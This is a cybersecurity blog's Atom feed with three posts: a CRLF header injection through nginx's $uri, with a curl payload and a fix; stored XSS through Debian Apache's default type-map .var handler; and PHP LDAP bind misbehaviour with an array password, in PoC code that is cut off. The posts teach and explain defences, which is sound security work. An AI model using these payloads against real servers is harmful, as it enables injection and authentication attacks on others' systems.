<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ReverseBrain | Cybersecurity Blog</title>
  
  
  <link href="https://reversebrain.github.io/atom.xml" rel="self"/>
  
  <link href="https://reversebrain.github.io/"/>
  <updated>2021-03-29T09:20:55.399Z</updated>
  <id>https://reversebrain.github.io/</id>
  
  <author>
    <name>ReverseBrain</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>The story of Nginx $uri variable and CRLF injection</title>
    <link href="https://reversebrain.github.io/2021/03/29/The-story-of-Nginx-and-uri-variable/"/>
    <id>https://reversebrain.github.io/2021/03/29/The-story-of-Nginx-and-uri-variable/</id>
    <published>2021-03-29T08:40:53.000Z</published>
    <updated>2021-03-29T09:20:55.399Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nginx-uri-and-document-uri-variables"><a href="#Nginx-uri-and-document-uri-variables" class="headerlink" title="Nginx $uri and $document_uri variables"></a>Nginx $uri and $document_uri variables</h1><p>According to nginx documentation, $uri and $document_uri contain the normalized URI whereas the normalization includes URL decoding the URI.<br>Working with nginx reverse proxy directives, you maybe find this configuration very familiar:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;static&#x2F; &#123;</span><br><span class="line">  return 302 https:&#x2F;&#x2F;example.com$uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>Every file requested under <em>/static/</em> folder will be redirect to another server, in this case <em>example.com</em>.</p><h1 id="Carriage-Return-Line-Feed-CRLF-Injection"><a href="#Carriage-Return-Line-Feed-CRLF-Injection" class="headerlink" title="Carriage Return Line Feed (CRLF) Injection"></a>Carriage Return Line Feed (CRLF) Injection</h1><p>A Carriage Return Line Feed (CRLF) Injection vulnerability is a type of Server Side Injection which occurs when an attacker inserts the CRLF characters in an input field to deceive the server by making it think that an object has terminated and a new one has begun.</p><p>Let’s create a docker container with nginx listening on port 8081 and a netcat listening locally on port 80. This is the <em>nginx.conf</em> file:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">user  nginx;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn;</span><br><span class="line">pid        &#x2F;var&#x2F;run&#x2F;nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       &#x2F;etc&#x2F;nginx&#x2F;mime.types;</span><br><span class="line">    default_type  application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;</span><br><span class="line">                      &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;</span><br><span class="line">                      &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;</span><br><span class="line"></span><br><span class="line">    access_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    # include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class="line">    </span><br><span class="line">    server &#123;</span><br><span class="line">        location &#x2F;static&#x2F; &#123;</span><br><span class="line">            return 302 http:&#x2F;&#x2F;172.17.0.1$uri;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Notice that location directive redirects all <em>/static/</em> routes to our netcat. If we request <em>/static/test.js</em> we receive the following HTTP request:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;static&#x2F;test.js HTTP&#x2F;1.1</span><br><span class="line">Host: 172.17.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p>Everything seems ok, but where is the problem? Let’s try to inject a CRLF like <em>/static/%0d%0aX-Foo:%20CLRF</em>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;static&#x2F;%0d%0aX-Foo:%20CLRF&quot; -v</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">*   Trying 127.0.0.1:8081...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8081 (#0)</span><br><span class="line">&gt; GET &#x2F;static&#x2F;%0d%0aX-Foo:%20CLRF HTTP&#x2F;1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8081</span><br><span class="line">&gt; User-Agent: curl&#x2F;7.74.0</span><br><span class="line">&gt; Accept: *&#x2F;*</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">&lt; Server: nginx&#x2F;1.19.8</span><br><span class="line">&lt; Date: Mon, 29 Mar 2021 09:05:45 GMT</span><br><span class="line">&lt; Content-Type: text&#x2F;html</span><br><span class="line">&lt; Content-Length: 145</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Location: http:&#x2F;&#x2F;172.17.0.1&#x2F;static&#x2F;</span><br><span class="line">&lt; X-Foo: CLRF</span><br><span class="line">&lt; </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;302 Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;302 Found&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.19.8&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br></pre></td></tr></table></figure><p>Take a look at server response, we find our injected header!<br>Exploitation now is limited only by imagination, read more about the vulnerability risks here: <a href="https://www.netsparker.com/blog/web-security/crlf-http-header/">https://www.netsparker.com/blog/web-security/crlf-http-header/</a></p><h1 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h1><p>Is there a way to avoid the CRLF injection in the nginx configuration? The answer is yes: just use $request_uri insted of $uri or $document_uri.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        location &#x2F;static&#x2F; &#123;</span><br><span class="line">            return 302 http:&#x2F;&#x2F;172.17.0.1$request_uri;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>If we repeat again the exploitation seen before now we get another different result:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">*   Trying 127.0.0.1:8081...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8081 (#0)</span><br><span class="line">&gt; GET &#x2F;static&#x2F;%0d%0aX-Foo:%20CLRF HTTP&#x2F;1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8081</span><br><span class="line">&gt; User-Agent: curl&#x2F;7.74.0</span><br><span class="line">&gt; Accept: *&#x2F;*</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">&lt; Server: nginx&#x2F;1.19.8</span><br><span class="line">&lt; Date: Mon, 29 Mar 2021 09:17:45 GMT</span><br><span class="line">&lt; Content-Type: text&#x2F;html</span><br><span class="line">&lt; Content-Length: 145</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Location: http:&#x2F;&#x2F;172.17.0.1&#x2F;static&#x2F;%0d%0aX-Foo:%20CLRF</span><br><span class="line">&lt; </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;302 Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;302 Found&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.19.8&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br></pre></td></tr></table></figure><p>Now the carriage returns and new lines are not parsed and we can’t inject other headers.</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Nginx-uri-and-document-uri-variables&quot;&gt;&lt;a href=&quot;#Nginx-uri-and-document-uri-variables&quot; class=&quot;headerlink&quot; title=&quot;Nginx $uri and $document_uri variables&quot;&gt;&lt;/a&gt;Nginx $uri and $document_uri variables&lt;/h1&gt;&lt;p&gt;According to nginx documentation, $uri and $document_uri contain the normalized URI whereas the normalization includes URL decoding the URI.&lt;br&gt;Working with nginx reverse proxy directives, you maybe find this configuration very familiar:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;location &amp;#x2F;static&amp;#x2F; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return 302 https:&amp;#x2F;&amp;#x2F;example.com$uri;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Is Apache vulnerable by default to XSS?</title>
    <link href="https://reversebrain.github.io/2020/12/01/Is-Apache-vulnerable-by-default-to-XSS/"/>
    <id>https://reversebrain.github.io/2020/12/01/Is-Apache-vulnerable-by-default-to-XSS/</id>
    <published>2020-12-01T08:41:19.000Z</published>
    <updated>2020-12-01T09:31:31.652Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache-vs-httpd"><a href="#Apache-vs-httpd" class="headerlink" title="Apache vs httpd"></a>Apache vs httpd</h1><p>Before starting, let’s clarify if Apache and httpd are different web servers. They are the same application, just that some Linux distributions refer to it differently within package managers and config files. RedHat-based distros (CentOS, Fedora) refer to it as httpd while Debian-based distros (Ubuntu) refer to it as apache. Gentoo, strangely enough, mostly refers to it as apache but config files have httpd in the naming conventions.</p><a id="more"></a><h1 id="Content-Negotiation"><a href="#Content-Negotiation" class="headerlink" title="Content Negotiation"></a>Content Negotiation</h1><p>Apache HTTPD supports content negotiation as described in the HTTP/1.1 specification. It can choose the best representation of a resource based on the browser-supplied preferences for media type, languages, character set and encoding. It also implements a couple of features to give more intelligent handling of requests from browsers that send incomplete negotiation information.</p><p>Content negotiation is provided by the mod_negotiation module, which is compiled in by default.</p><p>A resource may be available in several different representations. For example, it might be available in different languages or different media types, or a combination. One way of selecting the most appropriate choice is to give the user an index page, and let them select. However it is often possible for the server to choose automatically. This works because browsers can send, as part of each request, information about what representations they prefer. For example, a browser could indicate that it would like to see information in French, if possible, else English will do. Browsers indicate their preferences by headers in the request. To request only French representations, the browser would send</p><p><code>Accept-Language: fr</code></p><p>Note that this preference will only be applied when there is a choice of representations and they vary by language.</p><p>As an example of a more complex request, this browser has been configured to accept French and English, but prefer French, and to accept various media types, preferring HTML over plain text or other text types, and preferring GIF or JPEG over other media types, but also allowing any other media type as a last resort:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept-Language: fr; q&#x3D;1.0, en; q&#x3D;0.5</span><br><span class="line">Accept: text&#x2F;html; q&#x3D;1.0, text&#x2F;*; q&#x3D;0.8, image&#x2F;gif; q&#x3D;0.6, image&#x2F;jpeg; q&#x3D;0.6, image&#x2F;*; q&#x3D;0.5, *&#x2F;*; q&#x3D;0.1</span><br></pre></td></tr></table></figure><p>httpd supports ‘server driven’ content negotiation, as defined in the HTTP/1.1 specification. It fully supports the Accept, Accept-Language, Accept-Charset and Accept-Encoding request headers. httpd also supports ‘transparent’ content negotiation, which is an experimental negotiation protocol defined in RFC 2295 and RFC 2296. It does not offer support for ‘feature negotiation’ as defined in these RFCs.</p><h1 id="Negotiation-in-httpd"><a href="#Negotiation-in-httpd" class="headerlink" title="Negotiation in httpd"></a>Negotiation in httpd</h1><p>In order to negotiate a resource, the server needs to be given information about each of the variants. This is done in one of two ways:</p><ul><li>Using a type map (i.e., a *.var file) which names the files containing the variants explicitly, or</li><li>Using a ‘MultiViews’ search, where the server does an implicit filename pattern match and chooses from among the results.</li></ul><p>We will focus on the first way.</p><p>A type map is a document which is associated with the handler named type-map (or, for backwards-compatibility with older httpd configurations, the MIME-type application/x-type-map). Note that to use this feature, you must have a handler set in the configuration that defines a file suffix as type-map; this is best done with</p><p><code>AddHandler type-map .var</code></p><p>in the server configuration file.</p><p>At this time you can be confused, just keep reading and everything will be clear.</p><h1 id="XSS-in-var-file"><a href="#XSS-in-var-file" class="headerlink" title="XSS in .var file"></a>XSS in .var file</h1><p>Let’s create a simple Dockerfile to start an httpd container.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM httpd:alpine</span><br><span class="line">COPY .&#x2F;htdocs&#x2F; &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;</span><br></pre></td></tr></table></figure><p>and copy <em>xss.var</em> file inside <em>htdocs</em> folder.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Content-language: en</span><br><span class="line">Content-type: text&#x2F;html</span><br><span class="line">Body:----foo----</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">alert(1)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">----foo----</span><br></pre></td></tr></table></figure><p>Now we can start the container and check if the XSS is triggered.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t apache-xss .</span><br><span class="line">docker run -dit --name apache-xss --rm -p 8081:80 apache-xss</span><br></pre></td></tr></table></figure><p>Navigating to <em>/xss.var</em> nothing happened, the file is rendered as text. Ok, trust me, I am not lying, just keep reading.<br><img src="/2020/12/01/Is-Apache-vulnerable-by-default-to-XSS/xss_var_1.png"></p><p>Let’s first understand why this doesn’t work, this is the <em>httpd.conf</em> file line which prevents the XSS:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#AddHandler type-map var</span><br></pre></td></tr></table></figure><p>So, in <em>httpd</em>, the var handler directive is commented and so disabled by default but this is not true for <em>apache2</em> package in Debian-based distributions, let’s create another container.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FROM debian:buster</span><br><span class="line">RUN apt update &amp;&amp; apt install -y apache2</span><br><span class="line">COPY .&#x2F;htdocs&#x2F; &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">CMD apachectl -D FOREGROUND</span><br></pre></td></tr></table></figure><p>Start it again as we did before.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t apache-xss .</span><br><span class="line">docker run -dit --name apache-xss --rm -p 8081:80 apache-xss</span><br></pre></td></tr></table></figure><p>What happens if I navigate again to <em>/xss.var</em>? A picture is worth more than a thousand words.<br><img src="/2020/12/01/Is-Apache-vulnerable-by-default-to-XSS/xss_var_2.png"></p><p>If we check <em>mods-available/mime.conf</em> file, we can discover that the var handler is enabled by default:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># For type maps (negotiated resources):</span><br><span class="line"># (This is enabled by default to allow the Apache &quot;It Worked&quot; page</span><br><span class="line">#  to be distributed in multiple languages.)</span><br><span class="line">#</span><br><span class="line">AddHandler type-map var</span><br></pre></td></tr></table></figure><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Remember to use whitelist if you accept file upload in your website, in other cases disable the type-map var handler or you can be vulnerable to stored XSS.</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Apache-vs-httpd&quot;&gt;&lt;a href=&quot;#Apache-vs-httpd&quot; class=&quot;headerlink&quot; title=&quot;Apache vs httpd&quot;&gt;&lt;/a&gt;Apache vs httpd&lt;/h1&gt;&lt;p&gt;Before starting, let’s clarify if Apache and httpd are different web servers. They are the same application, just that some Linux distributions refer to it differently within package managers and config files. RedHat-based distros (CentOS, Fedora) refer to it as httpd while Debian-based distros (Ubuntu) refer to it as apache. Gentoo, strangely enough, mostly refers to it as apache but config files have httpd in the naming conventions.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Break the PHP LDAP functions</title>
    <link href="https://reversebrain.github.io/2020/10/02/Break-the-PHP-LDAP-functions/"/>
    <id>https://reversebrain.github.io/2020/10/02/Break-the-PHP-LDAP-functions/</id>
    <published>2020-10-02T13:27:08.000Z</published>
    <updated>2020-10-02T14:07:05.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="What-is-LDAP"><a href="#What-is-LDAP" class="headerlink" title="What is LDAP?"></a>What is LDAP?</h1><p>LDAP is the Lightweight Directory Access Protocol, and is a protocol used to access “Directory Servers”. The Directory is a special kind of database that holds information in a tree structure.</p><a id="more"></a><p>The concept is similar to your hard disk directory structure, except that in this context, the root directory is “The world” and the first level subdirectories are “countries”. Lower levels of the directory structure contain entries for companies, organisations or places, while yet lower still we find directory entries for people, and perhaps equipment or documents.</p><h1 id="LDAP-usage-in-PHP"><a href="#LDAP-usage-in-PHP" class="headerlink" title="LDAP usage in PHP"></a>LDAP usage in PHP</h1><p>We will focus on two LDAP PHP functions which are involved in the CVE, <em>ldap_bind</em> and <em>ldap_errno</em>.</p><p>Let’s start with an example of <strong>ldap_bind</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// using ldap bind</span></span><br><span class="line">$ldaprdn  = <span class="string">&#x27;uname&#x27;</span>;     <span class="comment">// ldap rdn or dn</span></span><br><span class="line">$ldappass = <span class="string">&#x27;password&#x27;</span>;  <span class="comment">// associated password</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to ldap server</span></span><br><span class="line">$ldapconn = ldap_connect(<span class="string">&quot;ldap://ldap.example.com&quot;</span>)</span><br><span class="line">    <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Could not connect to LDAP server.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($ldapconn) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// binding to ldap server</span></span><br><span class="line">    $ldapbind = ldap_bind($ldapconn, $ldaprdn, $ldappass);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// verify binding</span></span><br><span class="line">    <span class="keyword">if</span> ($ldapbind) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;LDAP bind successful...&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;LDAP bind failed...&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The <em>ldap_bind</em> function, as the name suggests, just bind to the LDAP server by providing the LDAP link identifier, an rdn and a password, if the bind is successful the function returns <em>true</em>, else returns <em>false</em>.</p><p>Now let’s see another example of <strong>ldap_errno</strong>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// This example contains an error, which we will catch.</span></span><br><span class="line">$ld = ldap_connect(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">$bind = ldap_bind($ld);</span><br><span class="line"><span class="comment">// syntax error in filter expression (errno 87),</span></span><br><span class="line"><span class="comment">// must be &quot;objectclass=*&quot; to work.</span></span><br><span class="line">$res =  @ldap_search($ld, <span class="string">&quot;o=Myorg, c=DE&quot;</span>, <span class="string">&quot;objectclass&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!$res) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;LDAP-Errno: &quot;</span> . ldap_errno($ld) . <span class="string">&quot;&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;LDAP-Error: &quot;</span> . ldap_error($ld) . <span class="string">&quot;&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Argh!&lt;br /&gt;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$info = ldap_get_entries($ld, $res);</span><br><span class="line"><span class="keyword">echo</span> $info[<span class="string">&quot;count&quot;</span>] . <span class="string">&quot; matching entries.&lt;br /&gt;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Basically, the <em>ldap_errno</em> function returns the error number of the last LDAP command, in this case 87 since there is a filter error.</p><h1 id="Where-is-the-bug"><a href="#Where-is-the-bug" class="headerlink" title="Where is the bug?"></a>Where is the bug?</h1><p>Well, there is no evidence of bug or logical errors since there, so let’s create a local environment with <em>slapd</em> LDAP server and phpLDAPadmin, then write a simple PHP page.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$badpassword = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">$goodpassword = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">$bugpassword[] = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"></span><br><span class="line">$ldap = ldap_connect(<span class="string">&quot;ldap://localhost&quot;</span>);</span><br><span class="line"></span><br><span class="line">ldap_set_option($ldap, LDAP_OPT_PROTOCOL_VERSION, <span class="number">3</span>);</span><br><span class="line">ldap_set_option($ldap, LDAP_OPT_REFERRALS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$bind = ldap_bind($ldap, <span class="string">&quot;cn=admin,dc=example,dc=com&quot;</span>, $badpassword);</span><br><span class="line">$errno = ldap_errno($ldap);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Bind 1\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ldap_bind return: &quot;</span> . $bind . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ldap_errno return: &quot;</span> . $errno . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">$bind = ldap_bind($ldap, <span class="string">&quot;cn=admin,dc=example,dc=com&quot;</span>, $goodpassword);</span><br><span class="line">$errno = ldap_errno($ldap);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Bind 2\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ldap_bind return: &quot;</span> . $bind . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ldap_errno return: &quot;</span> . $errno . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">$bind = ldap_bind($ldap, <span class="string">&quot;cn=admin,dc=example,dc=com&quot;</span>, $bugpassword);</span><br><span class="line">$errno = ldap_errno($ldap);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Bind 3\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ldap_bind return: &quot;</span> . $bind . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ldap_errno return: &quot;</span> . $errno;</span><br><span 